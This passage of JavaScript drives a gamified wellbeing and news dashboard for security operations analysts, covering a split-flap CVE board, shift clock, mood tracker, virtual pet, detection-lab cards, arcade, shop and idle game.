  Snd.on[name]=on; const lvl={hum:.5,rain:.35,lofi:.6}[name]; ch.g.gain.setTargetAtTime(on?lvl:0.0001,Snd.ctx.currentTime,.6); $("#radioBtn").classList.toggle("on",Object.values(Snd.on).some(Boolean)); }
$("#radioBtn").onclick=()=>{ const r=$("#radio"), open=r.hidden; r.hidden=!open; $("#radioBtn").setAttribute("aria-expanded",String(open)); if(open) sfx("tick"); };
document.addEventListener("click",e=>{ const r=$("#radio"); if(!r.hidden&&!r.contains(e.target)&&!$("#radioBtn").contains(e.target)){ r.hidden=true; $("#radioBtn").setAttribute("aria-expanded","false"); } });
$$("#radio [data-ch]").forEach(b=>b.onchange=()=>setChannel(b.dataset.ch,b.checked));
$("#sfxOn").checked=Snd.sfx; $("#sfxOn").onchange=()=>{ Snd.sfx=$("#sfxOn").checked; store.set("sfx",Snd.sfx); if(Snd.sfx) sfx("chime"); };
$("#vol").value=Math.round(Snd.vol*100); $("#vol").oninput=()=>{ Snd.vol=$("#vol").value/100; store.set("vol",+$("#vol").value); if(Snd.master) Snd.master.gain.setTargetAtTime(Snd.vol,Snd.ctx.currentTime,.1); };
document.addEventListener("click",e=>{ if(e.target.closest("nav a,.seg button,.tablike button")) sfx("tick"); },true);

/* ---------- split-flap arrivals board ---------- */
const FLAP_CH=" ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-./";
function flapSet(el,text,width,delay){ text=String(text).toUpperCase().replace(/[^A-Z0-9 \-./]/g," ").padEnd(width).slice(0,width);
  if(el.children.length!==width) el.innerHTML=Array.from({length:width},()=>'<span class="fl"> </span>').join("");
  let changed=0; [...el.children].forEach((c,i)=>{ const tgt=text[i]; if(c.textContent===tgt) return; changed++;
    if(RM){ c.textContent=tgt; return; } let n=3+Math.floor(Math.random()*7);
    setTimeout(function step(){ c.textContent=n<=0?tgt:FLAP_CH[1+Math.floor(Math.random()*(FLAP_CH.length-1))]; c.classList.remove("go"); void c.offsetWidth; c.classList.add("go"); if(n-->0) setTimeout(step,60); },(delay||0)+i*16); });
  return changed; }
var FROM={"CVE-2026-76461":"CISCO SEG","CVE-2024-3400":"PAN-OS","CVE-2025-53770":"SHAREPOINT","CVE-2014-6271":"BASH","CVE-2017-0144":"WINDOWS SMB","CVE-2021-34527":"WINDOWS","CVE-2022-30190":"WINDOWS","CVE-2021-44228":"LOG4J","CVE-2023-4966":"NETSCALER","CVE-2024-3094":"XZ UTILS"};
const STATUS_CLS={"EXPLOITED":"st-red","KEV LISTED":"st-red","POC PUBLIC":"st-amber","WATCH":"st-amber","LANDED":"st-teal"};
let flapPage=0;
function boardRows(){ const now=FP_DATA.trending.map(c=>({c,st:c.st||(c.kev===true?"KEV LISTED":"WATCH")}));
  const old=FP_DATA.hof.slice().sort((a,b)=>b.year-a.year).map(c=>({c,st:"LANDED"}));
  const pages=[now.slice(0,5)]; for(let i=0;i<old.length;i+=5) pages.push(old.slice(i,i+5)); return pages; }
function renderFlaps(animate){ const pages=boardRows(), rows=pages[flapPage%pages.length], box=$("#flapRows");
  if(box.children.length!==5) box.innerHTML=Array.from({length:5},()=>`<div class="frow" role="link" tabindex="0"><div class="flaps id"></div><div class="flaps nk"></div><div class="flaps prod"></div><div class="flaps st"></div></div>`).join("");
  let changed=0; [...box.children].forEach((r,i)=>{ const x=rows[i]; r.dataset.id=x?x.c.id:""; const d=animate?i*140:0;
    changed+=flapSet(r.querySelector(".id"),x?x.c.id:"",14,d)+flapSet(r.querySelector(".nk"),x?x.c.nick:"",20,d+60)+flapSet(r.querySelector(".prod"),x?(FROM[x.c.id]||x.c.product.split(/[ (/]/)[0]):"",11,d+120)+flapSet(r.querySelector(".st"),x?x.st:"",10,d+180);
    const st=r.querySelector(".st"); st.className="flaps st "+(x?STATUS_CLS[x.st]||"":""); });
  if(animate&&changed&&$("#v-lounge").classList.contains("on")) clatter(900); }
$("#flapRows").onclick=e=>{ const r=e.target.closest(".frow"); if(r&&r.dataset.id) location.hash="#menu"; };
$("#flapRows").onkeydown=e=>{ if(e.key==="Enter"&&e.target.closest(".frow")) location.hash="#menu"; };
setInterval(()=>{ if(document.hidden||!$("#v-lounge").classList.contains("on")) return; flapPage++; renderFlaps(true); },75000);

/* ---------- top strip, clock, title ---------- */
const WX=(n=>n>=10?["storm","Patch storm"]:n>=5?["storm","Scattered exploits"]:n>=1?["cloud","Cloudy, chance of PoC"]:["sun","Suspiciously calm"])(FP_DATA.kevAddedLast7d);
function tick(){
  const now=new Date(), ms=nextPatchTuesday(now)-now, d=Math.floor(ms/864e5), h=Math.floor(ms/36e5)%24;
  $("#pt").textContent=d>0?`in ${d}d ${h}h`:`in ${h}h, brace`;
  const hh=now.getHours(), night=hh>=22||hh<6; document.body.classList.toggle("night",night);
  $("#clock").innerHTML=`${ic(night?"moon":"shift")} <b>${String(hh).padStart(2,"0")}:${String(now.getMinutes()).padStart(2,"0")}</b> ${night?"night shift":"day shift"}`;
  const days=Math.max(0,Math.floor((Date.now()-new Date(FP_DATA.lastEdgeCritical+"T00:00:00Z"))/864e5));
  $("#days").textContent=days; const df=$("#daysFlap"); if(!df.dataset.v||df.dataset.v!=String(days)){ df.dataset.v=days; df.classList.add("big"); flapSet(df,String(days).padStart(2,"0"),2,300); }
  $("#signsub").textContent=days===0?"It happened today. We're fine. Everything is fine.":`Our record is ${FP_DATA.edgeRecordDays}. Please don't lean on the VPN concentrator.`;
  const st=store.get("shiftStart",null), len=store.get("shiftLen",12);
  if(st){ const el=Date.now()-st, pct=Math.min(100,el/(len*36e5)*100);
    $("#shiftClock").textContent=fmtDur(el); $("#shiftBar").style.width=pct+"%";
    $("#shiftInfo").textContent=pct>=100?"Shift complete. Log off, go home, touch grass.":`${Math.round(pct)}% of a ${len}-hour shift, ${fmtDur(len*36e5-el)} to go`;
    document.title=`${fmtDur(el).slice(0,5)} on shift | FP Café`;
  } else document.title=`FP Café | ${WX[1]}, ${FP_DATA.kevAddedLast7d} new KEV this week`; }
function greeting(){ const h=new Date().getHours(), n=P().name; const g=h>=22||h<6?"Night shift":h<12?"Morning":h<18?"Afternoon":"Evening"; return `${g}${n?", "+esc(n):""}`; }
function applyHat(){ $("#hello").innerHTML=greeting(); renderMascot(); }
function renderMascot(){ const st=typeof petState==="function"&&typeof pet!=="undefined"?petState()[0]:"ok"; const m=$("#cat");
  const mood=document.body.classList.contains("night")&&st==="ok"?"ok":st; m.innerHTML=mascot(P().buddy, typeof inv!=="undefined"?inv.hat:"", mood); m.setAttribute("aria-label",`Pet ${BUD().n}`); }

/* ---------- buddy ---------- */
function patchSays(){ const p=P(), night=document.body.classList.contains("night");
  let pool=p.humor==="gentle"?SAY_GENTLE.concat(SAY_ROLE[p.role]||[]):(night?SAY_NIGHT:SAY_DAY.concat(SAY_ROLE[p.role]||[]));
  const m=todayMood(); if(m!==null&&m>=3) pool=SAY_GENTLE.concat(["Rough day? Take a real break. The queue can wait five minutes."]);
  let line=pool[(sayI++)%pool.length]; if(p.name&&sayI%4===0) line=`${p.name}, `+line.charAt(0).toLowerCase()+line.slice(1);
  $("#say").textContent=line.replace(/\s{2,}/g," ").trim(); renderMascot(); }
function petState(){ if(pet.energy<20) return ["sleepy","Running on fumes. Coffee? For both of us."]; if(pet.happy<25) return ["sad","I miss our breaks. Pop some bubbles with me?"];
  if(pet.energy>70&&pet.happy>70) return ["happy","Thriving. Peak buddy energy."]; return ["ok","Doing okay. Keep me company."]; }
function renderPet(){ const st=petState();
  $("#petBars").innerHTML=`<div class="pbar"><span>energy</span><div class="bar warm"><i data-w="${pet.energy}"></i></div><b>${Math.round(pet.energy)}</b></div>
    <div class="pbar happy"><span>happy</span><div class="bar"><i data-w="${pet.happy}"></i></div><b>${Math.round(pet.happy)}</b></div>
    <p class="petnote">${esc(st[1])} Tap ${esc(BUD().n)} to pet.</p>`; applyW($("#petBars"));
  $("#snacks").innerHTML=["coffee","onigiri","donut"].map(k=>`<button data-snack="${k}" ${inv.snacks[k]?"":"disabled"} title="${esc(SHOP.find(i=>i.id===k).n)}">${itemArt(k)}${inv.snacks[k]}</button>`).join("")+`<a class="link" href="#shop">Shop</a>`;
  renderMascot(); }
function applyW(root){ root.querySelectorAll("[data-w]").forEach(el=>{ el.style.width=clamp(+el.dataset.w,0,100)+"%"; }); }
function renderDrop(){ const show=store.get("dropDay","")!==todayKey(); $("#dropCard").hidden=!show; if(show) $("#dropInfo").textContent=`${visitStreak()}-day visit streak. A longer streak means a bigger drop.`; }

/* ---------- moods ---------- */
function faceSVG(i){ const mouth=["M10 19q6 6 12 0","M11 19q5 3 10 0","M11 20h10","M11 21q5-4 10 0","M10 22q6-6 12 0"][i], col=["#5CE1C6","#8FD5A6","#8D93A8","#F2946B","#E8505B"][i];
  return `<svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="13" fill="none" stroke="${col}" stroke-width="2"/><circle cx="12" cy="13" r="1.6" fill="${col}"/><circle cx="20" cy="13" r="1.6" fill="${col}"/><path d="${mouth}" stroke="${col}" stroke-width="2" fill="none" stroke-linecap="round"/></svg>`; }
function renderMood(){ const m=todayMood();
  $("#moods").innerHTML=MOODS.map((x,i)=>`<button data-m="${i}" class="${m===i?'on':''}" aria-pressed="${m===i}">${faceSVG(i)}${esc(x[1].replace(" (bad kind)",""))}</button>`).join("");
  $("#moodReply").textContent=m===null?"One tap, once a shift. Your buddy adjusts to how you feel. Private to this browser.":MOOD_REPLY[m].replace(/\s{2,}/g," ").trim(); }

/* ---------- quests, level, badges, my corner ---------- */
function renderGame(){
  const q=quests(), done=q.filter(x=>x[1]).length;
  $("#quests").innerHTML=q.map(([t,ok,h])=>`<div class="quest ${ok?'done':''}"><span class="ok">${ok?ic("check"):""}</span><span class="t">${esc(t)}</span>${ok?"":`<a href="${h}">Go</a>`}</div>`).join("");
  $("#questHint").textContent=done===q.length?"all done":`${done} of ${q.length}`;
  const L=level(); $("#lvlNav").textContent=L.i+1;
  BADGES.forEach(([e,n,,f])=>{ if(f()&&!earned.has(n)){ earned.add(n); store.set("badges",[...earned]); toast(`Badge unlocked: ${n}`); sfx("chime"); } });
  if($("#v-me").classList.contains("on")) renderMe(); }
function renderMe(){
  const L=level(), p=P();
  $("#lvlEmoji").textContent=L.i+1; $("#lvlTitle").textContent=L.cur[2];
  $("#lvlXp").textContent=L.next?`${L.x} XP, ${L.next[0]-L.x} to ${L.next[2]}`:`${L.x} XP. Max level. Touch grass.`;
  $("#lvlBar").style.width=(L.next?((L.x-L.cur[0])/(L.next[0]-L.cur[0])*100):100)+"%";
  const all=moods(), days=lastDays(7);
  $("#week").innerHTML=days.map(d=>{ const m=all[dk(d)]; return `<div><i class="md ${m===undefined?"":"m"+m}" title="${m===undefined?"no check-in":esc(MOODS[m][1])}"></i>${d.toLocaleDateString(undefined,{weekday:"short"})}</div>`; }).join("");
  const rough=days.slice(-3).filter(d=>(all[dk(d)]??-1)>=3).length;
  $("#weekNote").textContent=rough>=3?"Three rough days in a row is a pattern worth noticing. Talk to your lead or someone you trust, and protect your breaks. If it feels like more than work stress, reaching out to a professional is a strong move.":
    rough>=1?"A rough day here and there is normal in a SOC. Be kind to yourself.":"Check in each shift to see your week.";
  $("#profSum").innerHTML=`<p><span class="muted">Buddy</span>${esc(BUD().n)}</p><p><span class="muted">Name</span>${p.name?esc(p.name):"none set"}</p><p><span class="muted">Role</span>${esc(p.role)}</p><p><span class="muted">SIEM</span>${esc(p.siem)}</p><p><span class="muted">Stack</span>${p.stack.length?p.stack.map(esc).join(", "):"none picked"}</p><p><span class="muted">Humour</span>${p.humor}</p>`;
  $("#badges").innerHTML=BADGES.map(([e,n,d])=>`<div class="bdg ${earned.has(n)?'':'locked'}"><span class="seal">${ic(e)}</span><b>${esc(n)}</b><span class="muted">${esc(d)}</span></div>`).join("");
  $("#bdgCount").textContent=`${earned.size} of ${BADGES.length}`;
  const pool=FP_DATA.trending.map(c=>[c,false]).concat(FP_DATA.hof.map(c=>[c,true])).filter(([c])=>watch.includes(c.id));
  const seen=new Set(); $("#watch").innerHTML=pool.filter(([c])=>!seen.has(c.id)&&seen.add(c.id)).map(([c,o])=>menuCard(c,o)).join("")||'<p class="muted">Nothing yet. Star any card on the CVE menu.</p>'; }
function renderDex(){ const caught=dex.filter(x=>x!=="0DAY").length;
  $("#dexCount").textContent=`${caught} of ${DEX_ALL.length}${dex.includes("0DAY")?", plus the golden one":""}`;
  const fishSvg=c=>`<svg viewBox="0 0 30 20"><path d="M2 10C8 2 16 2 22 8l6-5v14l-6-5C16 18 8 18 2 10z" fill="${c}"/></svg>`;
  $("#dex").innerHTML=DEX_ALL.map(id=>{ const c=FP_DATA.trending.concat(FP_DATA.hof).find(x=>x.id===id), got=dex.includes(id);
    return `<div class="dexi ${got?'':'locked'}">${fishSvg(got?"#7FB7EE":"#3A4360")}<b>${got?esc(c.nick):"unknown"}</b><span class="muted">${esc(id)}</span></div>`; }).join("")
    +`<div class="dexi ${dex.includes("0DAY")?'gold':'locked'}">${fishSvg(dex.includes("0DAY")?"#F5B841":"#3A4360")}<b>${dex.includes("0DAY")?"Golden 0-day":"rare sighting"}</b><span class="muted">appears rarely</span></div>`; }

/* ---------- onboarding ---------- */
function renderOnb(){
  optRow("#oRole",ROLES,draft.role); optRow("#oSiem",SIEMS,draft.siem); optRow("#oStack",VENDORS,draft.stack,true);
  optRow("#oHumor",["gentle","spicy"],draft.humor,false,x=>x==="gentle"?"Gentle and kind":"Spicy roasts");
  optRow("#oBuddy",Object.keys(BUDDIES),draft.buddy,false,k=>`${mascot(k,"","happy")}<span>${BUDDIES[k].n}</span><span class="d">${BUDDIES[k].d}</span>`); }

/* ---------- morning brew receipt ---------- */
function renderBrew(){
  const d=new Date();
  $("#brewDate").textContent="Morning brew, "+d.toLocaleDateString(undefined,{weekday:"long",day:"numeric",month:"long"});
  const items=FP_DATA.brew.map((b,i)=>Object.assign({},b,{mine:mineTags(BREW_TAGS[i]||[])})).sort((a,b)=>b.mine-a.mine);
  $("#brewItems").innerHTML=items.map((b,i)=>`<div class="item"><span class="n">${i+1}</span><div><p class="ttl">${esc(b.t)}${b.mine?' <span class="pill">your stack</span>':''}</p><p>${esc(b.take)}</p><p class="lol">${esc(b.lol)}</p></div></div>`).join("");
  const m=FP_DATA.manager;
  $("#mgr").innerHTML=`<p>This week's theme is <b>${esc(m.theme.toLowerCase())}</b>.</p><ul>${m.bullets.map(b=>`<li>${esc(b)}</li>`).join("")}</ul><p class="quote">If the board asks: ${esc(m.board)}</p>`;
  const tm=pick(TERMS,dayNum());
  $("#term").innerHTML=`<p class="termw">${esc(tm[0])}</p><p>${esc(tm[1])}</p>`;
  const near=nearestHistory();
  $("#otd").innerHTML=`<p><b>${esc(near.e.t)}</b>, ${near.e.year}. ${near.diff===0?"Exactly today.":near.diff>0?`${near.diff} days from now.`:`${-near.diff} days ago.`}</p><p>${esc(near.e.d)}</p><p><a href="#fame">See the whole timeline</a></p>`;
  const top=FP_DATA.trending.filter(t=>t.sev==="critical").slice(0,2), dle=store.get("dle_"+todayKey(),null), mine=FP_DATA.trending.filter(c=>isMine(c)).length;
  $("#miniBrew").innerHTML=`<p>${esc(WX[1])}: ${FP_DATA.kevAddedLast7d} KEV additions this week.</p><p>Hottest on the menu: ${top.map(t=>`<b>${esc(t.nick)}</b>`).join(" and ")}.</p><p>Word of the day: <b>${esc(tm[0])}</b>. SOCdle ${dle&&dle.done?"done":"is waiting"}.</p>${mine?`<p class="muted">${mine} trending CVE${mine>1?"s":""} match your stack.</p>`:""}`; }

/* ---------- menu, hall of fame ---------- */
function menuCard(c,old){
  const heat=c.sev==="critical"?3:c.sev==="high"?2:1;
  return `<article class="mcard sev-${esc(c.sev)}">
    <div class="row"><span class="nick">${esc(c.nick)}</span><span><span class="spice" title="${esc(c.sev)}">${ic("chili","fill").repeat(heat)}</span><button class="star ${watch.includes(c.id)?'on':''}" data-star="${esc(c.id)}" aria-label="Watch ${esc(c.nick)}">${ic("star")}</button></span></div>
    <div class="cve">${esc(c.id)}, ${esc(c.product)}${old?`, ${c.year}`:""}</div>
    <div>${sevPill(c.sev)} ${old?"":kevPill(c.kev)} ${isMine(c)?'<span class="pill p-you">your stack</span>':''}</div>
    ${c.type?`<p class="lbl">What it is</p><p>${esc(c.type)}</p>`:""}
    <p class="lbl">${old?"The lesson":"Why it matters"}</p><p>${esc(old?c.lesson:c.why)}</p>
    ${c.action?`<p class="lbl">Do this</p><p>${esc(c.action)}</p>`:""}
    <p class="lbl">The roast</p><p class="roast">${esc(c.roast)}</p>
    <p class="hug">${esc(c.hug)} <a href="https://nvd.nist.gov/vuln/detail/${encodeURIComponent(c.id)}" target="_blank" rel="noopener noreferrer">NVD entry</a></p>
  </article>`; }
function renderHof(){
  $("#eras").innerHTML=["all","classic","modern","recent"].map(e=>`<button class="${e===era?'on':''}" data-e="${e}">${e==="all"?"All eras":e[0].toUpperCase()+e.slice(1)}</button>`).join("");
  $("#hof").innerHTML=FP_DATA.hof.filter(h=>era==="all"||h.era===era).map(h=>`<article class="mcard sev-${esc(h.sev)}">
    <div class="row"><span class="nick">${esc(h.nick)}</span><span class="muted">${h.year}</span></div>
    <div class="cve">${esc(h.id)}, ${esc(h.product)}</div>
    <p class="roast">${esc(h.roast)}</p><p class="muted small">Analyst mood: ${esc(h.feel.replace(/^\S+\s/,""))}</p>
    <p class="lbl">The lesson</p><p>${esc(h.lesson)}</p><p class="hug">${esc(h.hug)}</p></article>`).join("");
  const near=nearestHistory();
  $("#tl").innerHTML=FP_DATA.history.slice().sort((a,b)=>a.year-b.year||a.md.localeCompare(b.md)).map(e=>{ const [m,d]=e.md.split("-").map(Number);
    const dt=new Date(e.year,m-1,d).toLocaleDateString(undefined,{day:"numeric",month:"short",year:"numeric"});
    return `<div class="tli ${e===near.e?'near':''}"><span class="d">${dt}</span><b>${esc(e.t)}</b><p class="muted small">${esc(e.d)}</p></div>`; }).join(""); }

/* ---------- detection lab ---------- */
function detBody(d){ const tab=detTab[d.id]||defaultTab();
  return `<p>${esc(d.why)}</p><p class="lbl">Data you need</p><p class="small">${esc(d.data)}</p>
  <div class="tablike">${DET_TABS.map(([k,l])=>`<button data-dtab="${k}" data-det="${esc(d.id)}" class="${k===tab?'on':''}">${l.replace(" · ",", ")}</button>`).join("")}</div>
  <div class="codebox">${esc(d[tab])}</div>
  <div class="row"><button class="btn sm" data-dcopy="${esc(d.id)}">${ic("copy")}Copy query</button><span class="muted small">A starting point. Field names vary by parser, so test on last week's data first.</span></div>
  <div class="detgrid"><div><p class="lbl">Triage</p><ol class="tight">${d.triage.map(x=>`<li>${esc(x)}</li>`).join("")}</ol><p class="lbl">If it's real</p><ul class="tight">${d.respond.map(x=>`<li>${esc(x)}</li>`).join("")}</ul></div>
  <div><p class="lbl">Common false positives</p><ul class="tight">${d.fp.map(x=>`<li>${esc(x)}</li>`).join("")}</ul><p class="lbl">Tuning tip</p><p class="small">${esc(d.tune)}</p></div></div>`; }
function detCard(d,open){ return `<div class="det ${open?'open':''}" id="det-${esc(d.id)}"><button class="dethead" data-dopen="${esc(d.id)}" aria-expanded="${open}"><span class="dt">${esc(d.t)}</span>${sevPillD(d.sev)}<span class="pill p-lav">${esc(d.tactic)}</span><span class="pill p-unk">${esc(d.tech)}</span><span class="chev">${ic("chev")}</span></button><div class="detbody">${open?detBody(d):""}</div></div>`; }
function renderDet(){ $("#detBrew").innerHTML=`<p class="dtitle">${esc(DET.t)}</p><div class="row">${sevPillD(DET.sev)}<span class="pill p-unk">${esc(DET.tech)}</span></div>${detBody(DET)}<p class="row"><a class="link" href="#detect">Open the detection lab</a></p>`; }

/* ---------- arcade screens ---------- */
const GAME_IC={PD:"detect",TR:"siren",KC:"link",LH:"eye"};
function renderArcade(){
  $("#gtabs").innerHTML=Object.entries(GAMES).map(([k,g])=>`<button data-g="${k}" class="${k===arc.game?'on':''}">${esc(g.n)}</button>`).join("");
  $("#arcCode").textContent=arc.code; $("#arcDaily").classList.toggle("on",arc.code===dailyCode(arc.game)); $("#arcHow").textContent=GAMES[arc.game].how;
  const lb=lbGet(arc.code);
  $("#lb").innerHTML=lb.length?lb.slice(0,20).map((x,i)=>`<div class="lbrow ${x.me?'me':''}"><span class="rk">${i+1}</span><span class="nm">${esc(x.n)}${x.me?" (you)":""}</span><b>${x.s}</b></div>`).join(""):'<p class="muted">No scores for this code yet. Play, then paste teammates\' result codes below.</p>';
  $("#lbTitle").textContent=arc.code; if(!arc.running&&!arc.result) idleScreen(); }
function idleScreen(){ const g=GAMES[arc.game], best=lbGet(arc.code).find(x=>x.me);
  $("#gameArea").innerHTML=`<div class="idle">${ic(GAME_IC[arc.game],"huge")}<h3>${esc(g.n)}</h3><p>${esc(g.how)}</p><p class="muted small">Challenge <span class="code">${esc(arc.code)}</span>${best?`, your best is ${best.s}`:""}</p><button class="btn primary" id="gPlay">${ic("play")}Play</button></div>`;
  $("#gPlay").onclick=()=>{ sfx("whoosh"); startGame(); }; }
function endGame(score,summary){
  arc.running=null; arc.result=true; score=Math.max(0,Math.round(score)); bump("arcade");
  const prev=(lbGet(arc.code).find(x=>x.me)||{}).s; lbAdd(arc.code,myName(),score,true); const rc=resultCode(score);
  sfx(prev===undefined||score>prev?"chime":"pop");
  $("#gameArea").innerHTML=`<div class="idle"><span class="muted">final score</span><div class="score">${score}</div>${prev!==undefined&&score>prev?'<span class="pill p-mint">new personal best</span>':""}
    <p>${summary.replace(/ · /g,", ")}</p><div class="codebox">${esc(rc)}</div>
    <div class="row"><button class="btn primary" id="gShare">${ic("copy")}Copy for team chat</button><button class="btn" id="gAgain">${ic("refresh")}Play again</button></div></div>`;
  $("#gShare").onclick=()=>copyText(`FP Café arcade, ${GAMES[arc.game].n}\nChallenge code: ${arc.code}\nMy score: ${score}\nBeat me: open Arcade, join the code, then paste my result:\n${rc}`);
  $("#gAgain").onclick=startGame; renderArcade(); }

/* ---------- shop ---------- */
function renderShop(){
  const cats=[["hat","Hats for your buddy","Wear one at a time."],["theme","Themes","Recolour the whole café."],["decor","Things for the tank","Everything you own shows in the aquarium."],["snack","Snacks","Feed your buddy from the lounge."]];
  const sw={matrix:["#03100A","#3DFF88","#7CFF9E"],synth:["#140626","#FF6AD5","#36F9F6"],amber:["#100A02","#FFB000","#FFD9A0"],sakura:["#1B1019","#FFB7D2","#B7E4FF"]};
  $("#shopList").innerHTML=cats.map(([c,t,d])=>`<h2 class="shopcat">${t}</h2><p class="muted">${d}</p><div class="shopgrid">${SHOP.filter(i=>i.cat===c).map(i=>{
    const own=owns(i.id), eq=(c==="hat"&&inv.hat===i.id)||(c==="theme"&&inv.theme===i.id); let btn;
    if(c==="snack") btn=`<button class="btn sm" data-buy="${i.id}" ${beans<i.c?"disabled":""}>Buy for ${i.c}</button><span class="muted small">you have ${inv.snacks[i.id]}</span>`;
    else if(!own) btn=`<button class="btn sm" data-buy="${i.id}" ${beans<i.c?"disabled":""}>Buy for ${i.c}</button>`;
    else if(c==="decor") btn=`<span class="pill p-mint">in your tank</span>`;
    else btn=`<button class="btn sm ${eq?'on':''}" data-eq="${i.id}">${eq?"Wearing":"Use"}</button>`;
    const art=c==="theme"?`<div class="swatch">${sw[i.id].map(x=>`<i data-bg="${x}"></i>`).join("")}</div>`:`<div class="art">${itemArt(i.id)}</div>`;
    return `<div class="shopitem ${own?'owned':''}">${art}<b>${esc(i.n)}</b>${i.d?`<span class="muted small">${esc(i.d)}</span>`:""}${btn}</div>`; }).join("")}</div>`).join("")
    +`<div class="row"><button class="btn ghost sm" data-eq="__plain">Take the hat off</button><button class="btn ghost sm" data-eq="__theme">Default theme</button></div>`;
  $$("#shopList [data-bg]").forEach(el=>{ el.style.background=el.dataset.bg; }); }

/* ---------- tycoon ---------- */
function renderTyNums(){ $("#tyA").textContent=fmt(ty.a); $("#tyR").textContent=fmt(rate())+"/s"; $("#tyClickV").textContent="+"+fmt(clickVal());
  const on=performance.now()<boostUntil; $("#tyBoost").hidden=!on; if(on) $("#tyBoost").textContent=`x${boostM} boost, ${Math.ceil((boostUntil-performance.now())/1000)}s`;
  $$("#tyGens [data-gen]").forEach(b=>{ const g=GEN.find(x=>x.id===b.dataset.gen); b.disabled=ty.a<genCost(g); });
  $$("#tyUps [data-up]").forEach(b=>{ const u=UPG.find(x=>x.id===b.dataset.up); b.disabled=ty.a<u.c; }); }
function renderTycoon(){
  $("#tyGens").innerHTML=GEN.map(g=>`<div class="genrow"><span class="ge">${ic(g.e)}</span><div><b>${esc(g.n)}</b> <span class="muted">x${ty.own[g.id]}</span><p class="muted small">${esc(g.d)} ${fmt(genRate(g)*lessonM())}/s</p></div><button class="btn sm" data-gen="${g.id}">Hire, ${fmt(genCost(g))}</button></div>`).join("");
  const ups=UPG.filter(u=>!ty.up.includes(u.id)&&(u.gen===null||ty.own[u.gen]>=u.need));
  $("#tyUps").innerHTML=ups.length?ups.map(u=>`<button class="upg" data-up="${u.id}">${ic(u.e)}<b>${esc(u.n)}</b><span class="small">${esc(u.d)}</span><span class="small">${fmt(u.c)} alerts</span></button>`).join(""):'<p class="muted">Hire five of a role to unlock its next upgrade.</p>';
  const next=Math.floor(Math.sqrt(ty.all/1e6))-ty.lessons;
  $("#tyPrestige").innerHTML=`<p>Lessons learned: <b>${ty.lessons}</b>, worth +${ty.lessons*10}% to everything.</p><p class="muted small">Run a review to restart your SOC with more lessons. Unlocks at a million lifetime alerts.</p>
    <button class="btn sm" id="tyReview" ${next>0?"":"disabled"}>Run the review${next>0?`, +${next} lessons`:""}</button>`;
  $("#tyReview").onclick=()=>{ const n=Math.floor(Math.sqrt(ty.all/1e6))-ty.lessons; if(n<=0) return; ty.lessons+=n; ty.a=0; ty.life=0; GEN.forEach(g=>ty.own[g.id]=0); ty.up=[]; store.set("tycoon",ty); earn(50*n,"post-incident review"); renderTycoon(); };
  renderTyNums(); }

/* ---------- pop incidents ---------- */
function fireMI(force){
  if(!force&&(document.hidden||miOpen||miCount()>=10||(arc&&arc.running)||$("#onb").classList.contains("show"))){ scheduleMI(); return; }
  const q=MI[Math.floor(Math.random()*MI.length)]; miOpen=true; store.set("mi_"+todayKey(),miCount()+1);
  const box=$("#miBox"); box.classList.add("show");
  box.innerHTML=`<div class="mt">${ic("siren")}Pop incident<span id="miT">20s</span></div><div class="bar"><i id="miBar"></i></div><p>${esc(q.q)}</p>
    <div class="miopts">${q.o.map((o,i)=>`<button class="btn sm" data-mi="${i}">${esc(o)}</button>`).join("")}</div><p class="muted small" id="miW"></p>`;
  $("#miBar").style.width="100%"; sfx("pager"); let left=20;
  miTimer=setInterval(()=>{ left-=0.1; const t=$("#miT"), b=$("#miBar"); if(t) t.textContent=Math.ceil(left)+"s"; if(b) b.style.width=(left/20*100)+"%"; if(left<=0) closeMI("Expired. No penalty, another one will come."); },100);
  box.querySelector(".miopts").onclick=e=>{ const b=e.target.closest("[data-mi]"); if(!b||!miTimer) return; const ok=+b.dataset.mi===q.a;
    if(ok){ stats.mi++; store.set("stats",stats); earn(5,"",true); petGain(4,0); sfx("coin"); } else sfx("thud");
    closeMI(`${ok?"Correct, +5 beans.":"The answer: "+esc(q.o[q.a])+"."} ${esc(q.w)}`); renderGame(); }; }
function closeMI(msg){ clearInterval(miTimer); miTimer=null; const w=$("#miW"); if(w) w.innerHTML=msg; $$("#miBox [data-mi]").forEach(b=>b.disabled=true);
  setTimeout(()=>{ $("#miBox").classList.remove("show"); miOpen=false; },5000); scheduleMI(); }

/* ---------- redesign init (runs after the modules above have set up state) ---------- */
function redesignInit(){
  if(EV){ $("#evChip").hidden=false; $("#evChip").innerHTML=`${ic(EV.e)} ${esc(EV.n)}`; $("#evChip").title=EV.d; }
  $("#weather").innerHTML=`${ic(WX[0])} ${esc(WX[1])}`; $("#weather").title=`${FP_DATA.kevAddedLast7d} KEV additions in the last 7 days`;
  renderFlaps(true); renderMascot();
  const _earn=earn; earn=function(n,why,quiet){ _earn(n,why,quiet); if(n>0) sfx("coin"); };
}


/* ======================= v5: beans, shop, pet, tycoon, incidents, dex =======================
   Everything is local to this browser. All stored values are re-validated on load. */
const clamp=(v,a=0,b=100)=>Math.max(a,Math.min(b,Number.isFinite(v)?v:a));
const fin=(v,d=0)=>Number.isFinite(v)?v:d;
function fmt(n){ n=fin(n); if(n<1000) return n<10?(Math.round(n*10)/10).toString():Math.floor(n).toString();
  const u=["K","M","B","T","Qa","Qi"]; let i=-1; while(n>=1000&&i<u.length-1){ n/=1000; i++; } return n.toFixed(n<10?2:n<100?1:0)+u[i]; }
if(!Number.isFinite(stats.mi)) stats.mi=0;

/* ---------- daily events ---------- */
function eventToday(){ const d=new Date(), dow=d.getDay(), dom=d.getDate();
  if(dow===2&&dom>=8&&dom<=14) return {e:"patch",n:"Patch Tuesday",d:"Double beans on everything today.",m:2};
  if(d.getMonth()===9) return {e:"sparkle",n:"Cybersecurity Awareness Month",d:"Phish catches give triple beans.",m:1,phish:3};
  if(dow===5) return {e:"lock",n:"Read-only Friday",d:"No risky changes. Breaks give double beans.",m:1,brk:2};
  if(dow===0||dow===6) return {e:"breakroom",n:"Skeleton Crew Weekend",d:"Arcade games give +50% beans.",m:1,arc:1.5};
  return null; }
const EV=eventToday();
if(EV){ $("#evChip").style.display=""; $("#evChip").innerHTML=`${EV.e} <b>${esc(EV.n)}</b>`; $("#evChip").title=EV.d; }

/* ---------- beans ---------- */
let beans=Math.floor(clamp(store.get("beans",0),0,1e9));
function renderBeans(){ $("#beansChip").innerHTML=`<b>${fmt(beans)}</b> beans`; const s=$("#shopBeans"); if(s) s.textContent=fmt(beans); }
function earn(n,why,quiet){ n=Math.round(n*(EV?EV.m:1)); if(n<=0) return; beans+=n; store.set("beans",beans); renderBeans(); bumpAct();
